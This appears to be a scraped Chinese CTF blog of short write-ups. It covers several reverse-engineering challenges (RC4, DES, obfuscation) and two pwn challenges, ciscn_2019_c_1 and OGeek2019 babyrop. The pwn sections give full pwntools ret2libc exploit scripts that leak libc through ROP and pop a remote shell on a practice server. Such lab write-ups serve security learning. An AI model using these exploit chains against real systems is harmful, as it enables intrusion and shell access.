class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//初始化函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//加解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> key[] = &#123;<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">64</span>&#125;;</span><br><span class="line">    rc4_init(sbox,key,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123;<span class="number">0x76</span>,<span class="number">0x35</span>,<span class="number">0xfd</span>,<span class="number">0xf5</span>,<span class="number">0x7d</span>,<span class="number">0x47</span>,<span class="number">0xfe</span>,<span class="number">0x95</span>,<span class="number">0x13</span>,<span class="number">0x7a</span>,<span class="number">0x26</span>,<span class="number">0x59</span>,<span class="number">0x3f</span>,<span class="number">0xff</span>,<span class="number">0x31</span>,<span class="number">0xa1</span>,<span class="number">0x85</span>,<span class="number">0x7c</span>,<span class="number">0x63</span>,<span class="number">0x2</span>,<span class="number">0x6e</span>,<span class="number">0xbd</span>,<span class="number">0x93</span>,<span class="number">0x6a</span>,<span class="number">0x3e</span>,<span class="number">0x4d</span>,<span class="number">0x8d</span>,<span class="number">0xd7</span>,<span class="number">0x27</span>,<span class="number">0x73</span>,<span class="number">0x2d</span>,<span class="number">0x5e</span>,<span class="number">0xcc</span>,<span class="number">0x62</span>,<span class="number">0xf2</span>,<span class="number">0xdf</span>,<span class="number">0xe5</span>,<span class="number">0xd2</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    rc4_crypt(sbox,data,<span class="keyword">sizeof</span>(data)<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [pwn]ciscn_2019_c_1

ROP

1. 使用puts函数打印puts的加载地址
2. 获取到puts的地址后，再次布置栈，达到系统调用

execve系统调用号为59，参数为execve(&quot;/bin/sh&quot;,0,0);

&quot;/bin/sh&quot;libc中有

elf.got[&#39;puts&#39;]内存放puts的地址，symbols是对应的函数的地址

使用dynELF查libc版本或LibcSearcher(我的查找到之后要选择第一个)

如果是Ubuntu18，需要一个ret才可以对齐

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">s</span>):</span></span><br><span class="line">    sa = [i <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sa)):</span><br><span class="line">        sa[i] = ord(sa[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sa[i]&gt;=<span class="number">47</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">57</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xF</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]&gt;=<span class="number">65</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">90</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xE</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]&gt;=<span class="number">97</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">122</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xD</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(cnt):</span><br><span class="line">        res+=chr(sa[i])</span><br><span class="line">    res+=s[cnt:]</span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./ciscn&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29787</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">use: first give it got addr of puts,then we can calcute address of system(), as </span></span><br><span class="line"><span class="string">well as &#x27;/bin/bash&#x27;, next give it an overflow and get shell via gadget.</span></span><br><span class="line"><span class="string">note that it does some change with character in [0-9a-zA-Z]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">func_addr = <span class="number">0x4009A0</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(func_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]</span><br><span class="line">info(len(puts_addr))</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts_addr:0x%x&#x27;</span>%puts_addr)</span><br><span class="line">p.recv()</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">sys_addr = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;libc_base: 0x%x binsh: 0x%x sys_addr: 0x%x&#x27;</span>%(libc_base,binsh,sys_addr))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

## [rev] [MRCTF2020]EasyCpp

1. gdb加载基址指从相应段，如果实在找不到可以通过edb查看，或搜索内存中的特征串，然后通过偏移找到相关地址

2. 有几个lambda函数，可以点进去查看的

3. 输入9个数，存入vector

4. 第一个lambda函数把每一个数异或1

5. 第二个lambda找到每一个数的所有因数

6. 0换成O,1--&gt;l,2--&gt;z,3--&gt;E,4--&gt;A,5--&gt;s,6--&gt;G,7--&gt;T,8--&gt;B,9--&gt;q, (空格)--&gt;=

7. 最后提交的md5应该是大写，又不细心了= =

   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   </span><br></pre></td></tr></table></figure>

#include &lt;inttypes.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;memory.h&gt;
#include &lt;string.h&gt;
#include &lt;math.h&gt;

void printArray(const char* name, uint8_t* data, size_t len) &#123;
    printf(&quot;==============%s========&quot;, name);
    for (size_t i = 0; i &lt; len; i++) &#123;
        if (!(i % 16))printf(&quot;\n&quot;);
        printf(&quot;0x%02x,&quot;, data[i]);
    &#125;
    printf(&quot;\n================================\n&quot;);
&#125;

int main() &#123;
    char s[][256] = &#123;&quot;=zqE=z=z=z&quot;,&quot;=lzzE&quot;,&quot;=ll=T=s=s=E&quot;,&quot;=zATT&quot;,&quot;=s=s=s=E=E=E&quot;,&quot;=EOll=E&quot;,&quot;=lE=T=E=E=E&quot;,&quot;=EsE=s=z&quot;,&quot;=AT=lE=ll&quot;&#125;;
    char tab[256];
    tab[&#39;=&#39;] = &#39; &#39;;
    tab[&#39;O&#39;]=0;
    tab[&#39;l&#39;]=1;
    tab[&#39;z&#39;]=2;
    tab[&#39;E&#39;]=3;
    tab[&#39;A&#39;]=4;
    tab[&#39;s&#39;]=5;
    tab[&#39;G&#39;]=6;
    tab[&#39;T&#39;]=7;
    tab[&#39;B&#39;]=8;
    tab[&#39;q&#39;]=9;

    uint32_t num[9]=&#123;0&#125;;
    for(size_t i=0;i&lt;9;i++)&#123;
        char *ss = s[i];
        num[i]=1;
        uint32_t t = 0;
        for(size_t j=1;j&lt;strlen(ss);j++)&#123;
            if(ss[j]==&#39;=&#39;)&#123;
                num[i]*=t;
                t=0;
            &#125;else&#123;
                t=t*10+tab[ss[j]];
            &#125;
        &#125;
        num[i]*=t;
        num[i]^=1;
    &#125;
    for(size_t i=0;i&lt;9;i++)&#123;
        printf(&quot;%d &quot;,num[i]);
    &#125;
    printf(&quot;\n&quot;);
    return 0;

&#125;

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">## [rev][QCTF2018]Xman-babymips</span><br><span class="line"></span><br><span class="line">1. ~~对counter做了个很复杂的变换最后只取前5个&#x3D; &#x3D;~~</span><br><span class="line">2. 这段代码</span><br><span class="line">     &#96;&#96;&#96;assembly</span><br><span class="line">    lw      \$v0, 0x48+counter($fp)</span><br><span class="line"></span><br><span class="line">    addiu   $v1, $fp, 0x48+counter</span><br><span class="line"></span><br><span class="line">    addu    $v0, $v1, $v0</span><br><span class="line"></span><br><span class="line">    lb      $v1, 4($v0)</span><br></pre></td></tr></table></figure>

    实际上是加载了第counter个输入

    off_input=off_counter+4

3. input[i]^=(i-0x20)
4. 奇数位循环右移2位，偶数位循环左移2位

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x52</span>, <span class="number">0xfd</span>, <span class="number">0x16</span>, <span class="number">0xa4</span>, <span class="number">0x89</span>, <span class="number">0xbd</span>, <span class="number">0x92</span>, <span class="number">0x80</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0xa0</span>, <span class="number">0x8d</span>, <span class="number">0x45</span>, <span class="number">0x18</span>, <span class="number">0x81</span>, <span class="number">0xde</span>, <span class="number">0xfc</span>, <span class="number">0x95</span>, <span class="number">0xf0</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0x1a</span>, <span class="number">0x15</span>, <span class="number">0x5b</span>, <span class="number">0x75</span>, <span class="number">0x1f</span>]</span><br><span class="line">start = <span class="string">&#x27;Q|j&#123;g&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    <span class="keyword">if</span> ((i)&amp;<span class="number">1</span>):</span><br><span class="line">        a[i]=a[i]&gt;&gt;<span class="number">2</span>|(a[i]&lt;&lt;<span class="number">6</span>)&amp;<span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a[i]=(a[i]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xFF</span>|a[i]&gt;&gt;<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(start)):</span><br><span class="line">    a = [ord(start[<span class="number">4</span>-i])]+a</span><br><span class="line">print(a,len(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    a[i]^=(<span class="number">0x20</span>-i)</span><br><span class="line">print(a)</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>

## [pwn][OGeek2019]babyrop

1. 程序产生随机数，读取用户输入，如果用户输入和随机数相等，则可以有exp

    呼，可以让buf=0，然后比对的字符数就是0，可以跳过认证

2. 构造ROP链，先泄露write地址以便找到libc_base，然后利用

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25866</span>)</span><br><span class="line">payload =<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+p16(<span class="number">0xE7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">func_addr = <span class="number">0x80487d0</span></span><br><span class="line">write_addr = <span class="number">0x8048578</span></span><br><span class="line">pppr_addr = <span class="number">0x080488f9</span></span><br><span class="line">write_symbol = <span class="number">0x8049FEC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(write_addr)+p32(pppr_addr)+p32(<span class="number">1</span>)+p32(write_symbol)+p32(<span class="number">4</span>)+p32(func_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0xE7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">libc_base = write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;sys_addr: 0x%08x,binsh: 0x%08x&quot;</span>,sys_addr,binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

## [rev][SCTF2019]Who is he

1. 找Assembly-CSharp.dll，反编译的答案，错的
2. 看wp，感觉很离谱
3. 使用CE搜索Emmm，找到两处字符串，查看此时的Memory View，分别转到两个字符串，发现两个base64串和两个4字节的字符串，分别尝试，第二个成功了= =
4. 需要学习C#加密相关操作，另外吐槽x64dbg的字符串搜索不怎么好用。。
5. 继续使用CE在内存中翻找，可以找到PE头，把dll dump下来，和结果内容基本一致
6. dnspy调试unity也需要学习

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">s = bytes([<span class="number">0x78</span>,<span class="number">0x5A</span>,<span class="number">0x57</span>,<span class="number">0x44</span>,<span class="number">0x5A</span>,<span class="number">0x61</span>,<span class="number">0x4B</span>,<span class="number">0x45</span>,<span class="number">0x68</span>,<span class="number">0x57</span>,<span class="number">0x4E</span>,<span class="number">0x4D</span>,<span class="number">0x43</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x47</span>,<span class="number">0x59</span>,<span class="number">0x50</span>,<span class="number">0x42</span>,<span class="number">0x49</span>,<span class="number">0x6C</span>,<span class="number">0x59</span>,<span class="number">0x33</span>,<span class="number">0x2B</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x6F</span>,<span class="number">0x7A</span>,<span class="number">0x4F</span>,<span class="number">0x39</span>,<span class="number">0x7A</span>,<span class="number">0x6F</span>,<span class="number">0x6E</span>,<span class="number">0x77</span>,<span class="number">0x72</span>,<span class="number">0x59</span>,<span class="number">0x4C</span>,<span class="number">0x69</span>,<span class="number">0x56</span>,<span class="number">0x4C</span>,<span class="number">0x34</span>,<span class="number">0x6E</span>,<span class="number">0x6A</span>,<span class="number">0x53</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0x32</span>,<span class="number">0x52</span>,<span class="number">0x59</span>,<span class="number">0x4D</span>,<span class="number">0x32</span>,<span class="number">0x57</span>,<span class="number">0x77</span>,<span class="number">0x73</span>,<span class="number">0x47</span>,<span class="number">0x6E</span>,<span class="number">0x73</span>,<span class="number">0x6E</span>,<span class="number">0x6A</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,<span class="number">0x6E</span>,<span class="number">0x48</span>,<span class="number">0x73</span>,<span class="number">0x37</span>,<span class="number">0x4E</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x61</span>,<span class="number">0x46</span>,<span class="number">0x76</span>,<span class="number">0x4E</span>,<span class="number">0x45</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x6E</span>,<span class="number">0x6F</span>,<span class="number">0x53</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x50</span>,<span class="number">0x39</span>,<span class="number">0x46</span>,<span class="number">0x38</span>,<span class="number">0x65</span>,<span class="number">0x45</span>,<span class="number">0x70</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x73</span>,<span class="number">0x35</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x47</span>,<span class="number">0x2B</span>,<span class="number">0x4B</span>,<span class="number">0x4C</span>,<span class="number">0x30</span>,<span class="number">0x54</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x2F</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,<span class="number">0x55</span>,<span class="number">0x3D</span>])</span><br><span class="line">print(len(s))</span><br><span class="line"><span class="comment"># key = bytes(&#x27;1234&#x27;,encoding=&#x27;utf-8&#x27;)</span></span><br><span class="line">key = <span class="string">b&#x27;t\x00e\x00s\x00t\x00&#x27;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line">print(s,len(s))</span><br><span class="line">print(key,len(key))</span><br><span class="line">des = DES.new(key=key,mode=DES.MODE_CBC,iv=key)</span><br><span class="line">res = des.decrypt(s)</span><br><span class="line">print(res)</span><br><span class="line">print(res.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

## 参考资料

[1] [2019SCTF -- ctfwp](https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019SCTF)

## [rev][NPUCTF2020]Baby Obfuscation

1. F0X1

   辗转相除法求a,b最大公约数

2. F0X4

   ~(~a + b)=~(-a+b-1)=-(b-a-1)-1=a-b

3. F0X5

   快速幂

4. F0X3

    a&amp;&amp;b

5. F0X2

    !a&amp;&amp;!b

6. for循环

   1. 第一个if

      v33[j]=~(~str[j-1]+v35[(j-1)%4+4])=str[j-1]-v35[(j-1)%4+4]

   2. 第二个if不可能执行

   3. 第三个if

      v33[j]^=v35[(j-1)%4+4]

   4. 第四个if必不执行

   5. v33[j]*=10

7. 字符串长度为15

8. 比对

   (A0X6[k+1]-1)/10==v33[k]

